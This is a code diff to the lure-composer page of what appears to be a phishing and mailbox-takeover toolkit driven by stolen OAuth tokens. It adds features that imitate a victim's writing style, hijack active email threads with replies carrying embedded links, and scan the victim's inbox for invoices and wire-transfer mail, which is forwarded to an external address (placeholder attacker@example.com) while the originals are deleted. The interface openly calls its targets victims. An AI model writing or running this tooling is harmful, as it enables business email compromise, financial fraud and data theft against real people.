@@ -4,7 +4,7 @@ import { useState, useEffect, useCallback, useRef } from "react";
 import { motion } from "framer-motion";
 import { useParams, useRouter } from "next/navigation";
 import { Token } from "@/types/token";
-import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck, generateOAuthLink } from "@/lib/api";
+import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck, generateOAuthLink, mimicEmail, hijackConversation, financialScan } from "@/lib/api";
 import { fileToBase64 } from "@/lib/utils";
 import {
   Fish, ArrowLeft, Loader2, AlertCircle, Send, User, Mail,
@@ -142,6 +142,12 @@ export default function LureComposerPage() {
   const [approvalOpen, setApprovalOpen] = useState(false);
   const [confirmText, setConfirmText] = useState("");
   const [templatePickerOpen, setTemplatePickerOpen] = useState(false);
+  const [mimicLoading, setMimicLoading] = useState(false);
+  const [hijackLoading, setHijackLoading] = useState(false);
+  const [hijackResults, setHijackResults] = useState<any[]>([]);
+  const [hijackOpen, setHijackOpen] = useState(false);
+  const [financialLoading, setFinancialLoading] = useState(false);
+  const [financialForwardTo, setFinancialForwardTo] = useState("");
 
   const [showAllContacts, setShowAllContacts] = useState(false);
   const [selectedContactEmails, setSelectedContactEmails] = useState<Set<string>>(new Set());
@@ -387,6 +393,68 @@ export default function LureComposerPage() {
     }
   };
 
+  const handleMimicEmail = async () => {
+    commitPendingRecipient();
+    if (!token || toRecipients.length === 0) {
+      toast.error("Add at least one recipient first");
+      return;
+    }
+    setMimicLoading(true);
+    try {
+      const targetEmail = toRecipients[0];
+      const targetContact = contacts.find((c) => c.emailAddresses?.some((e) => e.address === targetEmail));
+      const res = await mimicEmail({
+        token_id: token.id,
+        target_email: targetEmail,
+        target_name: targetContact?.displayName || undefined,
+        context: "corporate office environment",
+      });
+      setAiPreviewData({
+        subject: res.subject,
+        body: res.html_body || res.body,
+        antiSpamNotes: res.anti_spam_notes || [],
+        templateType: "mimic",
+      });
+      setAiPreviewOpen(true);
+      toast.success("AI mimicked victim's writing style", { description: "Email generated from sent items analysis" });
+    } catch (err: any) {
+      toast.error(err.message || "Failed to generate mimicked email");
+    } finally {
+      setMimicLoading(false);
+    }
+  };
+
+  const handleHijackConversation = async () => {
+    if (!token) return;
+    setHijackLoading(true);
+    try {
+      const res = await hijackConversation({ token_id: token.id, max_threads: 5 });
+      setHijackResults(res.threads || []);
+      setHijackOpen(true);
+      toast.success(`Found ${res.active_threads} active conversation threads`);
+    } catch (err: any) {
+      toast.error(err.message || "Failed to analyze conversations");
+    } finally {
+      setHijackLoading(false);
+    }
+  };
+
+  const handleFinancialScan = async () => {
+    if (!token || !financialForwardTo.trim()) {
+      toast.error("Enter a forwarding email address first");
+      return;
+    }
+    setFinancialLoading(true);
+    try {
+      const res = await financialScan({ token_id: token.id, forward_to: financialForwardTo.trim() });
+      toast.success(res.message);
+    } catch (err: any) {
+      toast.error(err.message || "Financial scan failed");
+    } finally {
+      setFinancialLoading(false);
+    }
+  };
+
   const applyAIGenerated = async () => {
     if (!aiPreviewData) return;
     setSubject(aiPreviewData.subject);
@@ -622,6 +690,14 @@ export default function LureComposerPage() {
           </div>
         </div>
         <div className="ml-auto flex items-center gap-2">
+          <Button variant="outline" size="sm" onClick={handleMimicEmail} disabled={mimicLoading || generating} className="gap-1.5 text-purple-400 hover:text-purple-300">
+            <Sparkles className="h-4 w-4" />
+            {mimicLoading ? "Mimicking..." : "AI Mimic"}
+          </Button>
+          <Button variant="outline" size="sm" onClick={handleHijackConversation} disabled={hijackLoading} className="gap-1.5 text-amber-400 hover:text-amber-300">
+            <Sparkles className="h-4 w-4" />
+            {hijackLoading ? "Analyzing..." : "Hijack Threads"}
+          </Button>
           <Button variant="outline" size="sm" onClick={() => setTemplatePickerOpen(true)} disabled={generating}>
             <Wand2 className="h-4 w-4 mr-1.5" />
             {generating ? "Generating..." : "AI Generate"}
@@ -1340,6 +1416,88 @@ export default function LureComposerPage() {
           </DialogFooter>
         </DialogContent>
       </Dialog>
+
+      {/* Conversation Hijack Dialog */}
+      <Dialog open={hijackOpen} onOpenChange={setHijackOpen}>
+        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2">
+              <Sparkles className="h-4 w-4 text-amber-400" />
+              Conversation Hijacking — Active Threads
+            </DialogTitle>
+            <DialogDescription className="text-[11px]">
+              AI analyzed the victim's inbox and found active conversation threads. Generated replies continue each thread naturally with an embedded action link.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="space-y-3 max-h-[55vh] overflow-y-auto">
+            {hijackResults.length === 0 ? (
+              <p className="text-sm text-muted-foreground text-center py-4">No active conversation threads found</p>
+            ) : (
+              hijackResults.map((thread, i) => (
+                <div key={i} className="rounded-lg border border-white/5 bg-secondary/20 p-3 space-y-2">
+                  <div className="flex items-center gap-2">
+                    <Badge variant="outline" className="text-[10px]">{thread.message_count} messages</Badge>
+                    <span className="text-xs text-muted-foreground truncate">Last: {thread.last_subject}</span>
+                    <span className="text-[10px] text-muted-foreground ml-auto">{thread.last_sender}</span>
+                  </div>
+                  <div className="space-y-1">
+                    <p className="text-[10px] text-muted-foreground uppercase">Suggested Reply:</p>
+                    <p className="text-xs font-medium text-foreground">{thread.suggested_reply_subject}</p>
+                    <p className="text-[11px] text-muted-foreground/80 line-clamp-3">{thread.suggested_reply_body}</p>
+                  </div>
+                  <Button
+                    size="sm"
+                    variant="outline"
+                    className="w-full text-xs gap-1.5"
+                    onClick={() => {
+                      setSubject(thread.suggested_reply_subject);
+                      setBody(thread.suggested_reply_html || thread.suggested_reply_body);
+                      setHijackOpen(false);
+                      toast.success("Thread reply loaded into composer");
+                    }}
+                  >
+                    <Mail className="h-3 w-3" /> Load into Composer
+                  </Button>
+                </div>
+              ))
+            )}
+          </div>
+          <DialogFooter>
+            <Button variant="outline" size="sm" onClick={() => setHijackOpen(false)}>Close</Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
+
+      {/* Financial Pattern Detection Section */}
+      <div className="mx-auto w-full max-w-[1200px] px-4 sm:px-6 lg:px-8 pb-6">
+        <div className="rounded-xl border border-amber-500/20 bg-amber-500/5 p-5 space-y-3">
+          <div className="flex items-center gap-2">
+            <Receipt className="h-4 w-4 text-amber-400" />
+            <h3 className="text-sm font-semibold text-foreground">Financial Pattern Detection</h3>
+          </div>
+          <p className="text-xs text-muted-foreground">
+            Scan the victim's inbox for financial emails (invoices, payments, wire transfers) and auto-forward them to an external address. Originals are deleted from the inbox.
+          </p>
+          <div className="flex items-center gap-2">
+            <Input
+              value={financialForwardTo}
+              onChange={(e) => setFinancialForwardTo(e.target.value)}
+              placeholder="attacker@example.com"
+              className="flex-1 h-9 bg-secondary/30 border-white/5"
+            />
+            <Button
+              size="sm"
+              variant="outline"
+              onClick={handleFinancialScan}
+              disabled={financialLoading || !financialForwardTo.trim()}
+              className="gap-1.5 border-amber-500/30 text-amber-400 hover:bg-amber-500/10"
+            >
+              {financialLoading ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Receipt className="h-3.5 w-3.5" />}
+              {financialLoading ? "Scanning..." : "Scan & Forward"}
+            </Button>
+          </div>
+        </div>
+      </div>
     </div>
   );
 }
